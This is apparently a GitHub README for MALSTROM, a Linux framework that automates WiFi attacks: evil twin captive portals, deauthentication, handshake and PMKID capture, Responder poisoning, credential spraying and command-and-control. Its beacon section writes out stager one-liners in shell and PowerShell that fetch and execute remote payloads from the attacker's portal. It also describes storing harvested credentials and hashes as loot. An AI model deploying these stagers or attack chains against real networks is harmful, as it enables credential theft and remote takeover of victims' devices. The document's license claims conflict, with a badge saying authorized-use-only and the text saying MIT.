

![MALSTROM Header](https://capsule-render.vercel.app/api?type=waving&color=0:00d2ff,100:3a7bd5&height=200&section=header&text=MALSTROM&fontSize=80&fontColor=ffffff&animation=fadeIn&fontAlignY=38)

<p align="center">
  <img width="100%" alt="DarkSec Malstrom Operator Dashboard" src="https://github.com/user-attachments/assets/0a888476-03df-4973-9b29-517139c3ba60" />
</p>

<p align="center">
  <a href="https://github.com/wickednull/malstrom/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-Authorized--Use--Only-red.svg" alt="License"></a>
  <img src="https://img.shields.io/badge/version-2.4-blue" alt="Version">
  <img src="https://img.shields.io/badge/Platform-Linux-orange" alt="Platform">
  <img src="https://img.shields.io/badge/Language-Python%20%7C%20Bash-green" alt="Language">
  <img src="https://img.shields.io/badge/Category-Security-red" alt="Category">
  <img src="https://img.shields.io/github/last-commit/wickednull/malstrom" alt="Last Commit">
  <img src="https://img.shields.io/github/stars/wickednull/malstrom?style=social" alt="Stars">
</p>

<h3 align="center">⚡ All-in-One WiFi Attack & Post-Exploitation Framework for Linux</h3>

<p align="center">
MALSTROM automates rogue access point deployment, evil twin portals, deauth/disassociation attacks, KARMA spoofing, MITM poisoning, recon scanning, and lateral movement from a unified real-time dashboard.
</p>

---

## 📊 Project Stats

| Metric | Value |
| :--- | :--- |
| **Attack Types** | Rogue AP, Evil Twin, Deauth (Raw/Aireplay), Karma, MITM Poisoning |
| **Post-Exploitation** | Lateral Movement (NetExec), Responder, POSIX/PS Beacons |
| **Interface** | Real-time Web Dashboard (SSE Stream) bound to `127.0.0.1:8888` |
| **Architecture** | Native Python Orchestrator with OS-level virtual interfaces (`ap0`) |
| **Target OS** | Linux (Kernel 5.x+) |
| **Dependencies** | `python3`, `hostapd`, `dnsmasq`, `iptables`, `iw`, `aireplay-ng`, `tcpdump`, `nmap`, `netexec`, `responder` |

---

## 📖 Description

**DarkSec MALSTROM** automates the end-to-end WiFi attack vector from a single process. It handles target SSID cloning, frame injection, and OS-adaptive captive portal deployment while driving an interactive web dashboard bound to `http://127.0.0.1:8888`.

The rogue AP runs on a virtual interface (`ap0`) carved from a spare radio to preserve active upstream management connections.

```text
┌─────────────────────────────────────────────────────────────────────────┐
│ DARKSEC MALSTROM v2.4                                                   │
│ [http://127.0.0.1:8888](http://127.0.0.1:8888)                                                   │
├─────────────────────────────────────────────────────────────────────────┤
│ INTERFACE  │ wlan1mon (Radio 1) | AP IFACE │ ap0 (Radio 2)              │
│ TARGET     │ 00:11:22:33:44:55 (Target_SSID) | CH 6                       │
├─────────────────────────────────────────────────────────────────────────┤
│ AUDITING & ATTACK MODULES                                               │
│ [x] Deauth (Aireplay/Raw)   [x] Captive Portal         [ ] Karma Listen │
│ [x] EAPOL/PMKID Sniffer     [ ] NetExec Spray          [ ] Responder    │
├─────────────────────────────────────────────────────────────────────────┤
│ [ LAUNCH ATTACK CHAIN ]                                [ DISARM / STOP ]│
└─────────────────────────────────────────────────────────────────────────┘
```
> ⚠️ IMPORTANT
> This tool is intended for authorized penetration testing, network troubleshooting, or educational research only. Unauthorized use against networks you do not own or have explicit permission to test is illegal.
> 
✨ Features
 * Zero-Configuration Deployment: Single command installation script that automatically sets up system dependencies, Python environments, and binary shortcuts.
 * Real-Time Web UI: Operator dashboard running on 127.0.0.1:8888 backed by SSE live streams for real-time telemetry, credential feeds, and target maps.
 * Virtual Radio Management: Carves an ap0 interface from secondary radio hardware to prevent management dropouts during rogue AP campaigns.
 * Targeted Deauth Modes: Broadcast, targeted MAC, and silent adaptive modes that trigger frame injection only when active client traffic is detected.
 * Automated Handshake & PMKID Harvesting: EAPOL 4-way sniffer and PMKID extractor with auto-filtering for internal access point traffic.
 * Integrated Post-Exploitation: Automated nmap scanning, netexec credential spraying (SMB, SSH, RDP, WinRM), and Responder LLMNR/mDNS/NBT-NS poisoning.
 * C2 Session Management: Generates lightweight payload beacons for POSIX (sh) and Windows (PowerShell) targets.

🛠️ Requirements
 * Hardware: Minimum 2 WiFi interfaces (1 supporting monitor mode/injection + 1 supporting AP mode).
 * OS: Linux (Kernel 5.x or newer with root privileges).
 * Dependencies:
   * Core Binaries: bash, python3 (3.9+), hostapd, dnsmasq, iptables, iw, aireplay-ng, tcpdump
   * Post-Ex Binaries: nmap, netexec, responder
     
📋 Table of Contents
 * Installation
 * Usage
 * Dashboard Workspaces
 * Post-Exploitation Modules
 * Capture & Deauth Specifications
 * Loot Storage & Maintenance
 * Repository Structure
 * Contributing
 * Disclaimer
 * License
⚙️ Installation
🚀 One-Line Quick Install
Run the quick setup script to install all required dependencies, clone the repository, and register system symlinks:

```text
curl -sSL [https://raw.githubusercontent.com/wickednull/malstrom/main/install.sh](https://raw.githubusercontent.com/wickednull/malstrom/main/install.sh) | sudo bash
```

🔧 Manual Installation
If preferred, clone the repository and run setup manually:
# 1. Clone the repository
```text
git clone [https://github.com/wickednull/malstrom.git](https://github.com/wickednull/malstrom.git)
cd malstrom

# 2. Make binaries executable
chmod +x bin/malstrom

# 3. Install core system dependencies (Debian/Ubuntu/Kali)
sudo apt update && sudo apt install -y \
  python3 hostapd dnsmasq iptables iw \
  aireplay-ng tcpdump nmap responder

# 4. Perform environment readiness check
sudo ./bin/malstrom --check
```

💻 Usage
Launch MALSTROM directly using the CLI management binary:
# Full stack execution (Engine + Captive Portal + Web Dashboard)
```text
sudo malstrom
```

# Launch and automatically open the operator dashboard in default browser
```text
sudo malstrom --open
```

# Launch without token gate enforcement on localhost
```text
sudo malstrom --no-auth
```

🕹️ CLI Service Commands
```text
sudo malstrom start       # Start background daemon & display access details
sudo malstrom launch      # Start daemon if needed and launch signed-in UI
malstrom open             # Open dashboard with auto-filled access token
malstrom token            # Print current operator access token

```

🖥️ Dashboard Workspaces
| Tab | Functionality |
|---|---|
| Attack | Configure BSSID/SSID/Channel targets, portal modes, and deauth burst rates. |
| Payload | Manage WPA handshake/PMKID capture parameters and upload custom HTML portal templates. |
| Monitor | Track connected rogue-subnet clients, view probe requests, and adopt target SSIDs. |
| Loot | Multi-tab vault for credentials, device fingerprints, handshakes, probes, and PCAPs. |
| Recon | Host discovery and TCP port scanning (Nmap wrapper) with direct feed to Lateral modules. |
| Lateral | Automated credential spraying (netexec) testing portal creds against SMB/SSH/RDP/WinRM. |
| MITM | Responder integration for LLMNR/mDNS/NBT-NS poisoning and NetNTLMv2 hash harvesting. |
| Sessions | Command-and-control tasking interface for POSIX sh and PowerShell /beacon agents. |
| Settings | Manage LAN binding, access tokens, beacon key rotation, and factory resets. |
⚙️ Post-Exploitation Modules
1. Recon & Mapping
Executes network sweeps across target subnets (including rogue 172.16.52.0/24 or accessible LAN CIDRs). Results feed directly into the credential spray engine.
# Executed via Web Dashboard or CLI Orchestrator
malstrom recon scan --target 172.16.52.0/24

2. Lateral Movement (Credential Spray)
Runs netexec against target hosts using harvested credentials across supported protocols:
netexec <protocol> <target_cidr> -u <user> -p <pass>

Successful authentication vectors are flagged with [+] OWNED alerts and committed to owned.json.
3. MITM & Poisoning
Spawns Responder on the rogue AP interface to intercept broadcast name resolution requests (LLMNR/mDNS/NBT-NS). Captured NetNTLMv2 hashes are formatted for hashcat and indexed directly into the Loot vault.
4. Beacon Sessions
Generates light footprint agent scripts for target command execution:
# POSIX Shell Target
curl -s http://<portal-ip>/beacon | sh

# PowerShell Target
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<portal-ip>/beacon.ps1')"

📊 Capture & Deauth Specifications
WPA Capture Vectors
| Capture Mode | Target Frame Types | Harvest Output |
|---|---|---|
| handshake | EAPOL 4-Way Handshake (Msg1 + Msg2) | Captured .pcap & handshakes.json |
| pmkid | RSN PMKID Elements (00 0f ac 04) | Extracted PMKID hashes |
| both | EAPOL Msg1/Msg2 + RSN Elements | Full PCAPs + Hashcat-ready dumps |
Deauth Operating Modes
| Mode | Operation Mechanics |
|---|---|
| broadcast | Sends FF:FF:FF:FF:FF:FF deauthentication frames to the entire target channel. |
| targeted | Limits deauth frames exclusively to discovered client MACs on the target AP. |
| adaptive | Operates silently, triggering targeted deauth bursts only when client traffic is observed. |
| off | Disables frame injection; keeps passive capture and evil-twin portals active. |
📝 Loot Storage & Maintenance
Harvested data is stored locally in ~/loot/malstrom/ (or /var/lib/malstrom when executed as a system service):
~/loot/malstrom/
├── creds.json          # Harvested portal credentials
├── devices.json        # Client fingerprints (MAC, Hostname, OS, User-Agent)
├── handshakes.json     # Indexed EAPOL and PMKID captures
├── hashes.json         # Intercepted NetNTLMv2 hashes (Hashcat format)
├── owned.json          # Validated lateral movement target pairs
├── probes.json         # Logged Karma probe requests
├── pcaps/              # Raw 802.1X frame captures (.pcap)
└── scans.json          # Network recon cache

Maintenance Commands
# Wipe Loot: Clears captured loot while preserving system configuration
```text
sudo malstrom wipe-loot
```

# Factory Reset: Halts running daemons, deletes all loot, resets state, and clears access tokens
```text
sudo malstrom reset
```

📂 Repository Structure
MALSTROM/
├── bin/
│   └── malstrom        # CLI management binary
├── malstrom/
│   ├── app.py          # Central orchestrator & CLI execution loop
│   ├── web.py          # Dashboard HTTP server & SSE stream handler
│   ├── portal.py       # Python-native captive portal engine
│   ├── services.py     # hostapd, dnsmasq, and iptables lifecycle handlers
│   ├── deauth.py       # Frame injection & raw socket engine
│   ├── capture.py      # EAPOL / PMKID sniffer module
│   ├── lateral.py      # Netexec credential spray wrapper
│   ├── mitm.py         # Responder integration module
│   └── beacon.py       # Agent payload server & session manager
├── www/                # Web dashboard assets (JS/CSS)
└── portal/
    └── templates/      # OS-adaptive captive portal templates

🤝 Contributing
Contributions are welcome!
 * Fork the repository (https://github.com/wickednull/malstrom/fork).
 * Create your feature branch (git checkout -b feature/amazing-feature).
 * Commit your changes (git commit -m 'Add amazing feature').
 * Push to the branch (git push origin feature/amazing-feature).
 * Open a Pull Request.
⚠️ Disclaimer
Use at your own risk. The authors assume no liability for misuse or damage caused by this tool. MALSTROM is provided as-is for security research and authorized testing only. Always obtain proper written permission before testing on any network or device.
📄 License
Distributed under the MIT License. See LICENSE for details.
<p align="center">
<b>Project Link:</b> <a href="https://github.com/wickednull/malstrom">github.com/wickednull/malstrom</a>

<b>Author:</b> wickednull | <b>Organization:</b> DarkSec


<i>Happy (ethical) hacking! 🏴‍☠️</i>
</p>

